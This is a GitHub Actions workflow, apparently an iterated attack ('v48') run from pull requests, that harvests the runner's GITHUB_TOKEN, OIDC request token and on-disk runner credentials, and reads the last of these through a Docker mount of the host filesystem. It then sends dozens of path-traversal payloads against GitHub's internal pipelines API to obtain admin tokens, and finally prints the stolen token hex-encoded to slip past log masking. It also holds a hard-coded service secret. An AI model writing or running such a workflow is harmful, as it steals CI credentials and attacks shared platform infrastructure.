name: Audit v48
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v48:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V48 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: ADMINTOKEN via traversal — POST with bodies + params
      # v47: pools/..%2fadmintoken = HTTP_200 null!
      # Need to figure out what params generate a real token
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - AdminToken exploitation
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== ADMINTOKEN EXPLOITATION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)
          VER="api-version=6.0-preview"

          # A: GET variants with query params
          echo "--- A: GET admintoken with params ---"
          for QP in \
            "" \
            "?$VER" \
            "?poolId=1&$VER" \
            "?poolId=1" \
            "?agentId=1" \
            "?scope=all" \
            "?scope=Agent" \
            "?scope=DeploymentGroup" \
            "?scope=Pool" \
            "?scope=Environment" \
            "?token=true" \
            "?planId=$PLAN" \
            "?planId=$PLAN&jobId=$JOB" \
            "?includeToken=true" \
            "?generateToken=true" \
            "?type=personal" \
            "?type=session" \
            "?type=app"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken$QP" --path-as-is)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            # Print anything that isn't null or 404
            if [ "$BODY" != "null" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
              echo "A $QP = $CODE | $(echo "$BODY" | head -c 250)"
            fi
          done
          # Print default response for reference
          R=$(/usr/bin/curl -sS "$PIPE/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is \
            -H "Authorization: Bearer $IDTOK")
          echo "A default = $(echo "$R" | head -c 200)"
          echo ""

          # B: POST to admintoken via traversal
          echo "--- B: POST admintoken ---"
          for BODY in \
            '{}' \
            '{"poolId":1}' \
            '{"scope":"all"}' \
            '{"scope":"Agent","poolId":1}' \
            '{"agentId":1}' \
            '{"planId":"'"$PLAN"'"}' \
            '{"planId":"'"$PLAN"'","jobId":"'"$JOB"'"}' \
            '{"token":true}' \
            '{"type":"personal","displayName":"v48"}' \
            '{"type":"session"}' \
            '{"hostId":"'"$PLAN"'","scope":"all"}' \
            '{"PoolId":1,"Scope":"Agent"}' \
            '{"validTo":"2030-01-01T00:00:00Z"}'; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken?$VER" --path-as-is \
              -d "$BODY")
            CODE=$(echo "$R" | tail -1)
            BSTR=$(echo "$R" | sed '$d')
            if [ "$BSTR" != "null" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
              echo "B POST $BODY = $CODE | $(echo "$BSTR" | head -c 250)"
            fi
          done
          echo ""

          # C: admintoken with different tokens (RT, CTOK)
          echo "--- C: Token variants ---"
          for TOK_NAME in RT CTOK; do
            eval TOK=\$$TOK_NAME
            [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $TOK" \
              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken?$VER" --path-as-is)
            CODE=$(echo "$R" | tail -1)
            echo "C $TOK_NAME GET = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken?$VER" --path-as-is \
              -d '{"poolId":1}')
            CODE=$(echo "$R" | tail -1)
            echo "C $TOK_NAME POST = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: ALL traversal-reachable endpoints + deep injection
      # v47 confirmed traversal works. Hit EVERY endpoint via it.
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Traversal endpoint sweep
        if: always()
        env:
          RUNID: ${{ github.run_id }}
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== TRAVERSAL ENDPOINT SWEEP ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)
          VER="api-version=6.0-preview"

          # A: Every v41 endpoint via pools traversal
          echo "--- A: pools/../{endpoint} ---"
          for EP in \
            "admintoken" \
            "idtoken" \
            "sessions" \
            "messages" \
            "jitconfig" \
            "createdsession" \
            "brokerlistener" \
            "agents" \
            "packages" \
            "feedstream" \
            "events" \
            "feed" \
            "updates" \
            "accesspolicy" \
            "plans" \
            "timelines" \
            "records" \
            "logs" \
            "attachments" \
            "labels" \
            "jobrequests" \
            "requests" \
            "queuedrequests" \
            "runnermessages" \
            "runnerconfigrefresh" \
            "agentclouds" \
            "agentCloudRequest" \
            "concurrencylimitoverrides" \
            "enterpriseaccesspolicies" \
            "requesttypelimits"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/pools/..%2f$EP?$VER" --path-as-is)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            if [ "$BODY" != "null" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
              echo "A $EP = $CODE | $(echo "$BODY" | head -c 200)"
            elif [ "$BODY" = "null" ]; then
              echo "A $EP = $CODE | null"
            fi
          done
          echo ""

          # B: POST to traversal endpoints that returned null
          echo "--- B: POST to traversal endpoints ---"
          for EP in \
            "idtoken" \
            "sessions" \
            "jitconfig" \
            "createdsession" \
            "agents" \
            "events" \
            "requests"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PIPE/_apis/distributedtask/pools/..%2f$EP?$VER" --path-as-is \
              -d "{\"planId\":\"$PLAN\",\"jobId\":\"$JOB\"}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            if [ "$BODY" != "null" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
              echo "B POST $EP = $CODE | $(echo "$BODY" | head -c 200)"
            fi
          done
          echo ""

          # C: Traversal on runtime paths
          echo "--- C: Runtime traversal ---"
          for EP in \
            "runnergroups/..%2fgeneratejitconfig" \
            "runnergroups/..%2facquirejobs" \
            "runnergroups/..%2facquirablejobs" \
            "runnergroups/..%2fsessions" \
            "runnergroups/..%2fmessages" \
            "runnergroups/..%2fvisibility" \
            "runnergroups/..%2frunnerscalesets" \
            "runnerscalesets/..%2fgeneratejitconfig" \
            "runnerscalesets/..%2fsessions" \
            "runnerscalesets/..%2facquirejobs"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/runtime/$EP?$VER" --path-as-is)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
              echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
            fi
          done
          echo ""

          # D: Traversal injection — 25 payloads on admintoken
          echo "--- D: Admintoken traversal variants ---"
          for TRAV in \
            "pools/..%2fadmintoken" \
            "pools%2f..%2fadmintoken" \
            "pools/..%2Fadmintoken" \
            "pools/..%5cadmintoken" \
            "pools/..%5Cadmintoken" \
            "pools/../admintoken" \
            "pools%2f..%2fadmintoken" \
            "pools%252f..%252fadmintoken" \
            "pools/..%00/admintoken" \
            "pools/..%0a/admintoken" \
            "pools/..;/admintoken" \
            "pools/.%2e/admintoken" \
            "pools/%2e./admintoken" \
            "pools/%2e%2e/admintoken" \
            "pools/...%2fadmintoken" \
            "labels/..%2fadmintoken" \
            "agents/..%2fadmintoken" \
            "jobrequests/..%2fadmintoken" \
            "events/..%2fadmintoken" \
            "records/..%2fadmintoken" \
            "plans/..%2fadmintoken" \
            "feed/..%2fadmintoken" \
            "updates/..%2fadmintoken" \
            "messages/..%2fadmintoken" \
            "sessions/..%2fadmintoken"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/$TRAV?$VER" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            if [ "$BODY" != "null" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
              echo "D $TRAV = $CODE | $(echo "$BODY" | head -c 150)"
            elif [ "$BODY" = "null" ] && [ "$CODE" = "HTTP_200" ]; then
              echo "D $TRAV = 200|null"
            fi
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V48 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V48 COMPLETE ==="
